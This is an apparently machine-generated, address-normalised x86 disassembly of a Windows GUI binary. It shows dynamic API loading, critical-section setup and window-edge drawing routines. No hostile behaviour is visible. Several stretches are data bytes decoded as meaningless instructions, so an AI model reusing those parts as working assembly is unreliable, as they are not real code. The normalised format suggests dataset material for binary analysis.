pop ebp
retn 0x4
mov al 0x1
sub_42d8d8
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
mov eax r-xdata
mov [ rw-data ] eax
sub_42db5a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42db81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db88
retn
sub_42db9c
call sub_431e7c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
fild [ edx ]
add al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 8 + 0x42 ] dl
add [ eax + eax ] bl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push 0x6c0042dc
fadd [ edx ]
push cs
push esp
push ebx
jns r-xdata
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
outsd
add [ eax ] al
pushfd
fild [ edx ]
jo r-xdata
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4c ] si
fadd [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
fadd [ edx ]
sbb al 0x0
dec eax
push esp
std
inc [ ebx + ebx * 8 - 0x3974f882 ]
call sub_4034dc
pop esi
pop ebx
retn
push esi
test dl dl
je r-xdata
outsb
lea eax [ eax ]
retn
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x1fffbd24 ] dh
fadd [ edx ]
in al dx
fadd [ edx ]
adc [ ebx + eax * 2 + 0x72 ] dl
imul esi [ ecx + ebp * 2 + 0x63 ] 0x65536c61
arpl [ ecx + ebp * 2 + 0x6f ] si
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42dc70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42dcb0
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_42dd08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42dd2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd34
retn
sub_42dd40
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42dcf8
xor eax eax
push ebp
push sub_42def7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42defe
mov eax [ rw-data ]
call sub_42dd00
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42df00
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42dcf8
xor eax eax
push ebp
push sub_42e2b3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e2ba
mov eax [ rw-data ]
call sub_42dd00
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42e664
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42e68c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e6d4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e6db
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403128
call sub_42dd40
cmp [ rw-data ] 0x0
jg r-xdata
sub_42e6fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e721
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e728
retn
sub_42e734
and bh 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 + 0x42 ] cl
add [ esi - 0x18 ] ah
inc edx
add [ edx + eax ] cl
add [ eax ] al
test al 0x4e
inc esp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov dh 0x44
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add al dl
0xfe040042 0x44
sub_42e7b4
and [ ebx ] al
inc ebp
add [ edx + eax + 0x45 ] ch
add al cl
add [ eax + eax - 0x80 ] 0xf8
inc esp
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x74 ] 0x40042eb
add [ ebx + 0x3b008500 ] al
mov al 0x10
mov al 0x64
in al dx
inc edx
add al ah
in al dx
inc edx
add [ ebp + ebp * 8 + 0x42 ] al
add [ eax - 0x13 ] ah
inc edx
add [ ebx ] cl
push esp
push esp
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
js r-xdata
inc esp
in eax dx
inc edx
inc edx
add [ edi ] al
or edx [ esp + edx * 2 + 0x6f ]
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0xe780776f
inc edx
add [ edx + edx * 2 + 0x44 ] bl
add [ ebx ] cl
add [ edi ] al
push esp
outsd
outsd
insb
push edi
imul ebp [ esi ] r-xdata
call sub_432b89
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] ah
inc edx
add [ eax ] dh
add [ eax ] al
xchg esp eax
cmp al [ eax + eax + 0x70 ]
xor eax [ eax ]
insb
inc esp
add [ ebp + 0x44 ] bl
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bh
inc sp
add ah bh
inc esp
add [ eax + ebp * 2 + 0x44 ] dh
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x2c ] ax
inc esp
add [ ebx + 0x65000044 ] ch
inc esp
add [ 0x650c0044 ] al
inc esp
add [ eax - 0x7bffbb99 ] cl
in eax dx
inc edx
add [ esi + ebp * 8 ] cl
inc edx
add [ eax ] dl
out dx al
inc edx
add [ esi + ebp * 8 + 0x68800042 ] bh
inc esp
add [ edi ] cl
push esp
push esp
outsd
outsd
insb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 4 - 0x17 ] si
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
0x42 0x0
inc edx
add [ edx + 0xc0042ea ] bl
add eax [ eax ]
add [ edi + edi * 8 ] al
inc ebp
add [ esp + edx + 0x1dc00042 ] bh
inc esi
add [ edi + ebx + 0x46 ] dh
add [ ebx + esi + 0x43e00040 ] al
inc esi
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
pop ds
inc esi
add al dh
add al [ ebp ]
dec esp
and eax 0x8d140046
inc ecx
add [ eax + 0x6a ] al
inc esi
add al bl
and [ esi ] eax
in al 0x22
inc esi
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ ebx + ebp + 0x46 ] bl
add [ eax - 0x3ffbdef ] ah
inc si
add ah dl
out dx al
inc edx
add [ edi + ebp * 8 ] ch
inc edx
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax + ebp ] bh
inc esi
add [ eax + 0x100044f5 ] bh
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax ] dh
sub [ esi ] eax
pushfd
mov dl 0x44
add [ ebp + ecx * 4 + 0x44 ] bh
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ ebx + ebp ] ah
inc esi
add al dh
sub [ esi ] eax
inc eax
nop
inc esp
add [ ebx + ebp - 0x4cdfffba ] bl
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax + 0x32 ] al
inc esi
add [ eax - 0x34 ] bh
inc esp
add [ eax ] bl
out dx eax
inc edx
add [ edx + eax * 2 + 0x46 ] ah
add [ eax ] ah
inc ecx
inc esi
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x439c0044 ] dl
inc esi
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x70 ] 0xc000464a
or [ ebp ] eax
push 0xa40044f4
pop edi
inc esi
add [ eax ] ch
adc eax 0x17d80046
inc esi
add [ eax + edx * 2 + 0x20c00046 ] al
inc esi
add [ ecx ] bh
inc esi
add [ ebx + 0x1df80046 ] al
inc esi
add [ eax + 0x6800465e ] cl
inc ebp
inc esi
add [ eax ] bh
inc esi
add [ eax ] ah
sub eax [ esi ]
push es
add ch al
inc [ ecx - 0x5eff7c00 ]
add [ 0xffffffffb4011200 ] al
sub_42ead0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b4f8
mov al [ r-xdata ]
mov [ esi + 0x208 ] al
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x20a ] 0x2
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42eb24
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x208 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x208 ] al
mov eax ebx
call sub_44cd78
sub_42eb74
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
lea edi [ esp + 0x10 ]
push esp
mov eax ebx
call sub_44f7d8
push eax
call GetClientRect
push edi
mov eax ebx
call sub_44f7d8
push eax
call GetWindowRect
push 0x2
push edi
mov eax ebx
call sub_44f7d8
push eax
push 0x0
call MapWindowPoints
mov eax [ edi + 0x4 ]
neg eax
push eax
mov eax [ edi ]
neg eax
push eax
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
push esi
call ExcludeClipRect
mov eax [ edi + 0x4 ]
neg eax
push eax
mov eax [ edi ]
neg eax
push eax
push edi
call OffsetRect
xor eax eax
mov al [ ebx + 0x208 ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x209 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20a ]
or eax [ edx * 4 + rw-data ]
push eax
push edi
push esi
call DrawEdge
mov eax [ edi + 0xc ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
push esi
call IntersectClipRect
mov eax [ ebx + 0x170 ]
call sub_424a6c
push eax
push edi
push esi
call FillRect
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_42ec64
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov esi [ edi + 0x8 ]
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov ebp esi
push ebp
call InflateRect
xor eax eax
cmp [ ebx + 0x209 ] 0x0
je r-xdata
cmp [ ebx + 0x20a ] 0x0
je r-xdata
inc eax
mov esi ebp
test [ ebx + 0x208 ] 0x1
je r-xdata
inc eax
test [ ebx + 0x208 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x208 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x208 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
mov edx edi
mov eax ebx
call sub_450580
pop ebp
pop edi
pop esi
pop ebx
retn
sub [ esi + 0xc ] eax
sub_42ece0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42ed36
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed3d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ReleaseDC
retn
sub_42ed84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
mov ecx edi
xor edx edx
mov eax esi
call sub_446698
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
test bl bl
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
mov eax edi
call sub_448f3c
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_448f50
mov ecx eax
mov edx [ ebp - 0x4 ]
sub edx 0xa
mov eax [ ebp - 0x8 ]
sub eax 0xa
call sub_4170ec
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_449ec4
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42ee10
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebx + 0x38 ]
call sub_4607d8
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call sub_44684c
jmp r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edi [ ebx + 0x38 ]
mov edx [ edi + 0x44 ]
mov eax [ edi + 0x40 ]
call sub_417088
cmp esi [ ebx + 0x38 ]
je r-xdata
mov eax [ ebx + 0x50 ]
mov ebp [ ebx + 0x48 ]
sub eax ebp
add eax [ esi + 0x4c ]
mov edx [ ebx + 0x38 ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ ebx + 0x4c ]
mov edi [ ebx + 0x44 ]
sub ecx edi
add ecx [ esi + 0x48 ]
mov eax [ ebx + 0x38 ]
sub ecx [ eax + 0x48 ]
mov edx ebp
add edx [ esi + 0x44 ]
sub edx [ esp + 0xc ]
mov eax edi
add eax [ esi + 0x40 ]
sub eax [ esp + 0x8 ]
call sub_4170ec
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44896c
push 0x1
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov eax esi
call sub_44f7d8
push eax
call MapWindowPoints
sub_42eed4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4668d4
mov edx 0x1
mov eax esi
call sub_44f8f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42ef2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov bl 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x309 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x308 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e274
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
mov esi [ ebp - 0xc ]
mov esi [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x308 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
add esi [ eax + 0x300 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2fc ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e288
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x18 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0x18 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x309 ] 0x1
xor eax eax
push ebp
push sub_42f066
push [ fs : eax ]
mov [ fs : eax ] esp
sub edi [ ebp - 0x10 ]
push edi
sub esi [ ebp - 0x14 ]
push esi
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f06d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x309 ] 0x0
retn
mov eax [ ebp - 0x4 ]
add edi [ eax + 0x304 ]
jmp r-xdata
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_42f06d
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x48 ]
add eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4c ]
